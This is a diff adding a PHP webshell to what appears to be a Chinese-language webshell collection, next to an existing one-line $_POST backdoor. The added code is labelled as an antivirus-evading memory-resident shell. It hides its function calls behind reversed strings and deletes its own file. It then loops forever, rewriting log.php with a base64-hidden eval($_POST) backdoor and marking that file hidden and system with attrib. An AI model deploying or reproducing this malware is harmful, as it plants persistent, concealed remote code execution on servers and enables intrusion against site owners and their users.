@@ -197,6 +197,99 @@ parse_str($str);
 $a($_POST['a']);
 ?>
 ```
+**免杀内存马**
+```php
+<?php
+static $time =10000 ;     
+static $yourcode = 'Cjw/cGhwIGV2YWwoJF9QT1NUW2NdKTs/Pg==';      //bypass
+header("Content-Type: text/html; charset=utf-8");
+function EasyTo($myfile,$author){
+    fwrite($myfile,$author);
+    return Fread($myfile,"111"); 
+}
+class FileRead{
+    function __construct($read,$num){
+        $a = 1;
+        if ($num != Null)
+             $a = strlen($num);
+        print Fread($read,$a);
+    }
+    function test(){
+        echo "<br>"."ok\n";
+    }
+	function eb($yijufa){  
+        $b = "_46esab";
+		$e = "edocne";
+		$eb = srv($e.$b);
+        return $eb($yijufa);
+		
+    }
+    function db($jiekai){  
+        $c = "_46esab";
+		$a = "edoced";
+		$db = srv($a.$c);
+        return $db($jiekai);
+    }
+    function zhixing($hiddden){  
+        $ss = "ss";
+        $tt = "tt";
+        $yy = "yy";
+        $ee = "em";
+        $db = srv($ss[1].$yy[1].$ss[0]).srv($ee[1].$ee[0].$tt[0]);
+        return $db($hiddden);
+    }
+	
+	
+	
+
+}
+function srv($str){    
+    $new_str = "";
+	for ($i = strlen($str)-1;$i >= 0; $i--){
+        $new_str .= $str{$i};
+    }
+    return $new_str;
+}
+
+ignore_user_abort(true);
+set_time_limit($time);  
+
+while(1)
+{
+	$clear = fopen("log.php", "r"); 
+	fgets($clear);
+	echo $tmp = "\n".fgets($clear);  
+
+    $myfile = fopen("log.php ", "a+"); 
+    $a = $myfile;
+	$b = new FileRead($a,"asdasdasdasdasdasd");
+
+	
+    $t = date('Y-M-D H:i:s',time()); 
+	$tt = $b->eb($t);  
+	unlink(__FILE__);
+
+
+	$code = $yourcode; 
+
+	if(md5($tmp)===md5($b->db($code)))     
+	{
+	    
+		echo md5($tmp)."\n";
+		echo md5($b->db($code));	
+	}
+    else
+	    EasyTo($a,$b->db($tt.$code));  
+
+
+    echo $b->zhixing(srv("birtta")." +s +h log.php");
+	fclose($clear);
+	fclose($myfile);
+    usleep(5000000);
+    
+}
+?>
+```
 ## asp
 asp木马原型：
 ```asp
